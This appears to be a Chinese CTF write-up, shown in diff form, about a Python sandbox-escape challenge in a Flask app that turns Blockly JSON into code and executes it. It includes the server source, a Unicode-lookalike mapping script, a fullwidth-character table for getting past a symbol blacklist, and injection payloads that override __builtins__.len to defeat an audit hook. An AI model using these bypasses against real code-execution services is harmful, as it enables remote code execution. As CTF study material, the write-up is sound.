+        <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'fields'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'NUM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#当块类型为 math_number 时，检查 block 字典的 fields 键下的 NUM 键对应的值是否为数字。</span>
+<span class="token comment">#如果是数字，则将其转换为整数类型并赋值给 code；否则，将 code 置为空字符串。    </span>
+            code <span class="token operator">=</span>  <span class="token builtin">int</span><span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'fields'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'NUM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            code <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">elif</span> block_type <span class="token operator">==</span> <span class="token string">'text'</span><span class="token punctuation">:</span><span class="token comment">#如果包含黑名单符号，则将 code 置为空字符串；否则，使用 unidecode 函数将该值转换为 ASCII 字符串，并添加引号，赋值给 code。</span>
+        <span class="token keyword">if</span> check_for_blacklisted_symbols<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'fields'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'TEXT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            code <span class="token operator">=</span> <span class="token string">''</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+      
+            code <span class="token operator">=</span>  <span class="token string">"'"</span> <span class="token operator">+</span> unidecode<span class="token punctuation">.</span>unidecode<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'fields'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'TEXT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token comment">#函数unidecode.unidecode</span>
+    <span class="token keyword">elif</span> block_type <span class="token operator">==</span> <span class="token string">'max'</span><span class="token punctuation">:</span><span class="token comment">#从 block 字典的 inputs 键下的 A 和 B 键中分别获取对应的子块信息 a_block 和 b_block。</span>
+      
+        a_block <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'inputs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">]</span>
+        b_block <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'inputs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">]</span>
+        a <span class="token operator">=</span> block_to_python<span class="token punctuation">(</span>a_block<span class="token punctuation">)</span>  
+        b <span class="token operator">=</span> block_to_python<span class="token punctuation">(</span>b_block<span class="token punctuation">)</span>
+        code <span class="token operator">=</span>  <span class="token string-interpolation"><span class="token string">f"max(</span><span class="token interpolation"><span class="token punctuation">{</span>a<span class="token punctuation">}</span></span><span class="token string">, </span><span class="token interpolation"><span class="token punctuation">{</span>b<span class="token punctuation">}</span></span><span class="token string">)"</span></span>
+
+    <span class="token keyword">elif</span> block_type <span class="token operator">==</span> <span class="token string">'min'</span><span class="token punctuation">:</span>
+        a_block <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'inputs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">]</span>
+        b_block <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'inputs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">]</span>
+        a <span class="token operator">=</span> block_to_python<span class="token punctuation">(</span>a_block<span class="token punctuation">)</span>
+        b <span class="token operator">=</span> block_to_python<span class="token punctuation">(</span>b_block<span class="token punctuation">)</span>
+        code <span class="token operator">=</span>  <span class="token string-interpolation"><span class="token string">f"min(</span><span class="token interpolation"><span class="token punctuation">{</span>a<span class="token punctuation">}</span></span><span class="token string">, </span><span class="token interpolation"><span class="token punctuation">{</span>b<span class="token punctuation">}</span></span><span class="token string">)"</span></span>
+
+    <span class="token keyword">if</span> <span class="token string">'next'</span> <span class="token keyword">in</span> block<span class="token punctuation">:</span><span class="token comment">#Blockly 中的编程块可以按顺序连接形成一个序列，每个块通过 next 字段指向序列中的下一个块。</span>
+      
+        block <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'next'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">]</span>
+      
+        code <span class="token operator">+=</span><span class="token string">"\n"</span> <span class="token operator">+</span> block_to_python<span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">"\n"</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> code 
+    <span class="token keyword">return</span> code
+
+<span class="token keyword">def</span> <span class="token function">json_to_python</span><span class="token punctuation">(</span>blockly_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    block <span class="token operator">=</span> blockly_data<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment">#json的blocks对象的属性blocks的数组的第一个</span>
+
+    python_code <span class="token operator">=</span> <span class="token string">""</span>
+    python_code <span class="token operator">+=</span> block_to_python<span class="token punctuation">(</span>block<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>
+
+      
+    <span class="token keyword">return</span> python_code
+
+<span class="token keyword">def</span> <span class="token function">do</span><span class="token punctuation">(</span>source_code<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    hook_code <span class="token operator">=</span> <span class="token triple-quoted-string string">'''#审计钩子audit hook绕过
+def my_audit_hook(event_name, arg):
+    blacklist = ["popen", "input", "eval", "exec", "compile", "memoryview"]
+    if len(event_name) &gt; 4:#不允许event_name的长度大于4
+        raise RuntimeError("Too Long!")
+    for bad in blacklist:
+        if bad in event_name:
+            raise RuntimeError("No!")
+
+__import__('sys').addaudithook(my_audit_hook)
+
+'''</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>source_code<span class="token punctuation">)</span>
+    code <span class="token operator">=</span> hook_code <span class="token operator">+</span> source_code
+    tree <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">(</span>source_code<span class="token punctuation">,</span> <span class="token string">"run.py"</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>ast<span class="token punctuation">.</span>PyCF_ONLY_AST<span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> verify_secure<span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#AST沙箱绕过 </span>
+            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"run.py"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>      
+            result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'run.py'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'run.py'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> result
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">"Execution aborted due to security concerns."</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'run.py'</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token string">"Timeout!"</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> app<span class="token punctuation">.</span>send_static_file<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/blockly_json'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#接收了发给服务器/blockly_json路由的json</span>
+<span class="token keyword">def</span> <span class="token function">blockly_json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    blockly_data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>blockly_data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    blockly_data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>blockly_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>blockly_data<span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        python_code <span class="token operator">=</span> json_to_python<span class="token punctuation">(</span>blockly_data<span class="token punctuation">)</span><span class="token comment">#unidecode绕过</span>
+        <span class="token keyword">return</span> do<span class="token punctuation">(</span>python_code<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Error generating Python code"</span><span class="token punctuation">,</span> <span class="token string">"details"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+  
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>截一个print的</p>
+<p>由于在<code>static</code>文件夹的index.html在外部引用了俩<code>js</code>文件的链接，用yakit时前端一片空白就剩个按钮（哈哈无语</p>
+<p>自己搞一个（<del>绝对不会说自己是用ctrl c+v笨办法弄过来的</del></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./static/blockly.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./static/jquery-3.6.0.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/1c4cf20d925daada432aded319d37cce.png"></p>
+<p>化简</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">" "</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>#unidecode绕过</p>
+<ul>
+<li><blockquote>
+<p><code>unidecode</code> 是一个 Python 库，<code>unidecode.unidecode()</code> 函数用于将输入的 Unicode 字符串转换为近似的 ASCII 字符串。例如，将一些带重音符号的字母转换为对应的无重音字母，将中文等非 ASCII 字符转换为合适的 ASCII 表示（可能是拼音等）。</p>
+</blockquote>
+</li>
+</ul>
+<p><del>能不能cn统治世界啊受不了天天看English了，根本看不懂</del></p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000045024781">unidecode，一个神奇的 Python 库！ - Sitin - SegmentFault 思否</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.rapidtables.org/zh-CN/code/text/unicode-characters.html#google_vignette">Unicode字符表</a></p>
+<p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html">pyjail bypass-02 绕过基于字符串匹配的过滤 - DumKiy’s blog</a></p>
+<blockquote>
+<p><code>𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗 𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻  𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡</code> </p>
+</blockquote>
+<p><code>blacklist_pattern = r"[!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\\]^_</code>{|}~]”`</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+<span class="token keyword">import</span> unidecode
+
+<span class="token keyword">def</span> <span class="token function">filter_surrogates</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[\ud800-\udfff]'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">create_ascii_to_unicode_dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    ascii_to_unicode <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+    <span class="token keyword">for</span> ascii_code <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        ascii_char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ascii_code<span class="token punctuation">)</span>
+        unicode_chars <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> unicode_code <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            unicode_char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>unicode_code<span class="token punctuation">)</span>
+            <span class="token comment"># 过滤代理字符</span>
+            clean_unicode_char <span class="token operator">=</span> filter_surrogates<span class="token punctuation">(</span>unicode_char<span class="token punctuation">)</span>
+            ascii_representation <span class="token operator">=</span> unidecode<span class="token punctuation">.</span>unidecode<span class="token punctuation">(</span>clean_unicode_char<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> ascii_representation <span class="token operator">==</span> ascii_char <span class="token keyword">and</span> clean_unicode_char <span class="token operator">!=</span> ascii_char<span class="token punctuation">:</span>
+                unicode_chars<span class="token punctuation">.</span>add<span class="token punctuation">(</span>clean_unicode_char<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> unicode_chars<span class="token punctuation">:</span>
+            ascii_to_unicode<span class="token punctuation">[</span>ascii_char<span class="token punctuation">]</span> <span class="token operator">=</span> unicode_chars
+    <span class="token keyword">return</span> ascii_to_unicode
+
+mapping_dict <span class="token operator">=</span> create_ascii_to_unicode_dict<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> ascii_char<span class="token punctuation">,</span> unicode_chars <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>mapping_dict<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"ASCII: </span><span class="token interpolation"><span class="token punctuation">{</span>ascii_char<span class="token punctuation">}</span></span><span class="token string">, Unicode: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token string">', '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>unicode_chars<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">ASCII:  , Unicode:  ,  ,  ,  ,  ,  , ,  , 　,  ,  ,  ,  ,  ,  , ⠀,  ,  , ፡
+ASCII: !, Unicode: ǃ, ⠮, ៎, ❢, ﹗, ܄, ܃, ！, ՜, ¡, ￢, ¬
+ASCII: ", Unicode: Ҍ, ʺ, “, ❝, ‟, ❞, 々, ״, ”, ＂, ⠐, ⹂, 〃, ˝, ¨, ゝ, ˮ, ゞ, ҍ, ヾ, ヽ
+ASCII: #, Unicode: ▫, ▌, █, ▣, ▁, ▮, ▧, ▪, ◷, ▯, ◶, ▬, ▤, ▰, ◩, ░, ▐, ￭, ▨, ▓, ◳, ▅, ⠼, ＃, ▉, ▊, ▢, ▭, ▩, ◱, ◵, ♯, ▇, ▃, ۞, ◧, ▎, ■, ◫, ▆, ▦, ▄, ◨, ◲, ﹟, ▂, ▱, ◰, ▀, ▥, □, ◪, ▍, ▋, ◴, ▒, ▏
+ASCII: $, Unicode: ﹩, ＄, ⠫
+ASCII: %, Unicode: ﹪, ％, ٪, ⁒, ⠩, ⸓
+ASCII: &amp;, Unicode: ⠯, ۽, ﹠, ϗ, ＆, ⁊
+ASCII: ', Unicode: ઼, ٔ, ❜, ′, ՚, ׳, ʼ, ’, ٕ, ݂, ့, ⠄, ਼, ⸯ, ´, ˓, ฺ, ᾿, ᐞ, ´, ྰ, ়, ៜ, ऽ, ܐ, ઽ, أ, ᢩ, ٱ, ٵ, ʹ, ॒, ‛, ＇, ٳ, ଽ, ‘, Ъ, ᾽, ʹ, ʿ, འ, އ, ़, ˈ, ଼, ь, ॔, ъ, Ь, ॑, ٲ
+ASCII: (, Unicode: ⠷, ⁽, ︵, （, ₍, ﹙
+ASCII: ), Unicode: ⠾, Ↄ, ₎, ⁾, ）, ﹚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>好窒息。。。遂偷了一个别人的（</p>
+<pre class="line-numbers language-none"><code class="language-none">"!": "！",
+ '"': "＂",
+ "#": "＃",
+ "$": "＄",
+ "%": "％",
+ "&amp;": "＆",
+ "'": "＇",
+ "(": "（",
+ ")": "）",
+ "*": "＊",
+ "+": "＋",
+ ",": "❟",
+ "-": "‐",
+ ".": "․",
+ "/": "╱",
+ ":": "∶",
+ ";": "；",
+ "&lt;": "˂",
+ "=": "゠",
+ "&gt;": "˃",
+ "?": "？",
+ "@": "＠",
+ "[": "［",
+ "]": "］",
+ "\\": "＼",
+ "^": "⌃",
+ "_": "‗",
+ "`": "`",//测试了一下这个不行
+ "{": "｛",
+ "|": "ǀ",
+ "}": "｝",
+ "~": "～"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+
+blacklist_pattern <span class="token operator">=</span> <span class="token string">r"[!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\\]^_`{|}~]"</span>
+<span class="token keyword">def</span> <span class="token function">check_for_blacklisted_symbols</span><span class="token punctuation">(</span>input_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>blacklist_pattern<span class="token punctuation">,</span> input_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    
+word<span class="token operator">=</span><span class="token string">"！＼＂＃＄＆＇（）＊＋❟‐╱∶․；？＠［］‗｛ǀ｝～"</span>
+
+<span class="token keyword">if</span> <span class="token keyword">not</span> check_for_blacklisted_symbols<span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span>
+ 
+<span class="token comment">#hello</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>成功绕过</p>
+<p>其实这么看来可以直接用全角字符进行绕过<del>（忘了咩，跪</del></p>
+<p><del>算了就酱吧(我们大冤种是酱的</del></p>
+<p>#AST沙箱绕过 #审计钩子audit hook绕过</p>
+<p>文章都有写，便不再赘述了</p>
+<p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/python/2023/05/29/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86.html#%E5%9F%BA%E4%BA%8E-ast-%E7%9A%84%E6%B2%99%E7%AE%B1">CTF Pyjail 沙箱逃逸原理合集 - DumKiy’s blog</a></p>
+<p>值得注意（当然也能大致推测进而猜到</p>
+<blockquote>
+<p>在最新的稳定版本Python3.12当中，我试了一下<code>event_name=="eval"</code>，貌似不存在这个<code>event_name</code>，在我使用内置的<code>eval</code>函数时，它的<code>event_name</code>实际上是<code>exec</code>和<code>compile</code>（<code>eval</code>或者<code>exec</code>函数需要先经过<code>complie</code>函数把字符串编译为字节码或者AST对象，才能够执行）</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-08-%E7%BB%95%E8%BF%87-AST-%E6%B2%99%E7%AE%B1.html">pyjail bypass-08 绕过 AST 沙箱 - DumKiy’s blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html">pyjail bypass-07 绕过 audit hook - DumKiy’s blog</a></p>
+<p>唉，头大·<del>虽然这三个是一个人写的吧（</del></p>
+<p>一种是重写len函数</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">__builtins__<span class="token punctuation">.</span><span class="token builtin">len</span> <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token number">3</span>
+<span class="token comment">#__builtins__ 是 Python 解释器内置的一个模块对象，它包含了 Python 中所有的内置名称，像 len、print、int 等。在全局命名空间中，__builtins__ 实际上是指向 builtins 模块（Python 3）或者 __builtin__ 模块（Python 2）的引用</span>
+<span class="token comment">#len 原本是 Python 的内置函数，用于返回对象的长度。例如，对于列表、字符串、元组等可迭代对象，len() 会返回其包含的元素个数。</span>
+<span class="token comment">#lambda x: 3是一个匿名函数（lambda 函数），它接受一个参数 x，但无论传入什么参数，该函数都会返回整数 3。</span>
+<span class="token comment">#将 __builtins__ 模块中的 len 函数替换为了这个新定义的 lambda 函数。这意味着从这行代码执行之后，调用 len() 函数时，无论传入什么对象，都会返回 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1';__builtins__.len = lambda x: 3;print(len('xaxaxa'))#"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>（这时无<span class="token keyword">print</span>
+<span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1＇；‗‗builtins‗‗․len＝lambda x∶ 3；print（len（＇xaxaxa＇））＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1’；‗‗builtins‗‗․len＝lambda x：3；print（len（‘xaxaxa’））＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span> 
+<span class="token comment">#rce用 ' 闭合，；分割，#注释</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
